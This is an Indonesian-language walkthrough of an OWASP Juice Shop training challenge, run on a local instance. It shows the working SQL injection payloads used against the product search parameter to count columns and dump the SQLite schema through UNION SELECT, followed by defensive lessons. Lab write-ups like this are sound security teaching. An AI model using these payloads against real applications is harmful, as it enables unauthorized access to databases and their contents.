# Soal

- **Kategori**: Web – Injection  
- **Poin**    : ★★★ (3 bintang)  
- **Judul**   : Database Schema  
- **Tag**     : With Coding Challenge  

## Deskripsi 
Exfiltrate the entire DB schema definition via SQL Injection.

## Hint 
1. Temukan endpoint yang memberikan celah filter berlebihan dan uji input untuk SQL injection.  
2. Identifikasi sistem database yang digunakan dan di mana definisi schema biasanya disimpan.  
3. Buat serangan **UNION SELECT** untuk menggabungkan data dari tabel sistem schema ke hasil query asli.  
4. Lakukan injeksi bertahap, perbaiki error query satu per satu hingga berhasil menampilkan schema.  

# Resource
- [Juice Shop GitHub](https://github.com/juice-shop/juice-shop)  
- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)  

# Step by step

1. **Identifikasi injection point**  
   - Endpoint rentan:  
     ```
     http://127.0.0.1:3000/rest/products/search?q=<payload>
     ```
   - Parameter `q` terbukti rawan SQL injection.

2. **Cari jumlah kolom**  
   - Uji payload dasar:  
     ```
     test')) UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
     ```
   - Hasil menunjukkan query asli mengembalikan **9 kolom**, sehingga injeksi harus cocok dengan jumlah ini.

3. **Crafting payload untuk schema extraction**  
   - SQLite menyimpan definisi schema di tabel **sqlite_schema**.  
   - Payload untuk menampilkan schema:  
     ```
     test')) UNION SELECT 1,2,3,4,5,6,7,8,sql FROM sqlite_schema--
     ```

4. **Eksekusi payload**  
   - Kirim payload melalui parameter `q`.  
   - Aplikasi menampilkan definisi tabel (DDL) dari database, misalnya:  
     ```sql
     CREATE TABLE Users(id INTEGER PRIMARY KEY, email TEXT, password TEXT, ...)
     CREATE TABLE Products(id INTEGER PRIMARY KEY, name TEXT, description TEXT, ...)
     ```

5. **Verifikasi**  
   - Schema lengkap (tabel, kolom, constraint) muncul di hasil pencarian.  
   - Challenge terselesaikan ✅

<img width="1321" height="40" alt="image" src="https://github.com/user-attachments/assets/6efb000f-6240-4e2a-ab79-0aca98b50a21" />

<img width="1918" height="840" alt="image" src="https://github.com/user-attachments/assets/11c555f3-8924-45c3-ad83-13ebc9bddce9" />

<img width="1898" height="258" alt="Screenshot 2025-09-07 130247" src="https://github.com/user-attachments/assets/efd44237-6aa2-497c-b05d-a9ffb9db76e6" />

---

# Catatan / Pembelajaran

## Ringkasan
Challenge ini menunjukkan bagaimana SQL Injection bisa digunakan tidak hanya untuk bypass login, tapi juga untuk **exfiltrasi struktur database** secara lengkap. Dengan informasi schema, attacker dapat merencanakan serangan lanjutan (misalnya mencuri data user atau mengeksekusi query lebih kompleks).

## Konsep Serangan
- **UNION SELECT** dipakai untuk menggabungkan hasil query normal dengan tabel sistem (`sqlite_schema`).  
- Kolom hasil harus sama jumlah & tipenya dengan query asli.  
- SQLite (digunakan oleh Juice Shop) menyimpan definisi tabel dalam `sqlite_schema` (atau `sqlite_master` pada versi lama).  
- Kolom `sql` di tabel tersebut berisi perintah DDL (`CREATE TABLE ...`) yang mengungkap semua struktur database.

## Pembelajaran
1. **SQL Injection bisa bocorkan metadata**, bukan hanya data user.  
2. **Informasi schema = sangat berbahaya** → attacker tahu tabel apa saja yang ada, dan kolom sensitif apa yang bisa disasar.  
3. **Gunakan parameterized queries** agar query tidak bisa dimodifikasi oleh input user.  
4. **Least privilege**: aplikasi tidak perlu hak untuk membaca metadata schema secara penuh.  
5. **Error handling**: hindari menampilkan error SQL mentah ke user, karena mempercepat eksploitasi.  




